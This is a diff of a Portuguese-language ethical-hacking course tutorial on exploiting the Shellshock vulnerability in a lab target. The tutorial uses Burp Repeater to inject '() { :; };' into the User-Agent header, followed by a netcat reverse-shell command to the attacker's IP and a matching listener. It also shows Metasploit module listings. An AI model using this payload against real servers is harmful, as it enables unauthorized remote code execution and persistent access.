@@ -15,16 +15,22 @@ Shellshock é uma vunerabilidade antiga, improvável de ser encontrada atualment
 1. Abra o BurpSuite
 2. Na guia **Proxy**, abra o browser do BurpSuite. Ele já vem configurado com atribuições de proxy.
 3. No browser digite o IP da máquina alvo para abrir o seu website
+
 ![Website](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/e2c704a9c879b9b30fd6557e9564d3c03e80c800/7%20-%20websites/shellshock%201.png)
-4. Abra a aba **Target/SiteMap** do BurpSuite
-5. Clique no método GET ditetório /cgi-bin/status.
+
+5. Abra a aba **Target/SiteMap** do BurpSuite
+6. Clique no método GET ditetório /cgi-bin/status.
   - Obeserve a linha **User-agente** do **request**
   - Com o botão direito do mouse no painel **request**, selecione **send to repeater**
+
 ![BurpSuite - target](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/bb349b47077fbacf2a841edc84d40f4aaadef3a8/7%20-%20websites/shellshock%203.png)
+
 6. Abra a aba **Repeater**, e substitua o coneteúdo do **User_agent** por `() { :;}; ` (comando nulo) seguido pelo comando que deseje executar na máquina alvo entre aspas simples (').
   - No exemplo, queremos abrir um netcat...
     - `() { :; }; /bin/bash -c 'nc 192.168.0.178 5555 -e /bin/bash'`
+
 ![BurpSuite - repeater](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/bb349b47077fbacf2a841edc84d40f4aaadef3a8/7%20-%20websites/shellshock%202.png)
+
 7. Na máquina de ataque inicie no terminal um netcat modo listener para conecção com o alvo `nc -lvp 5555`
 8. No Burp, ainda na aba **Repeater**, clique em **send**.
 9. Pronto, temos uma conexão válida e podemos prosseguir escalando privilégios e criando persistência (como visto em *6 - Post Exploitation*).
@@ -57,7 +63,7 @@ Matching Modules
    2     \_ target: Linux x86                             .                .          .      .
    3     \_ target: Linux x86_64                          .                .          .      .
    4   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
-...
+   ...
    15  exploit/multi/misc/xdh_x_exec                      2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution
 ```
 Descrição (show info);
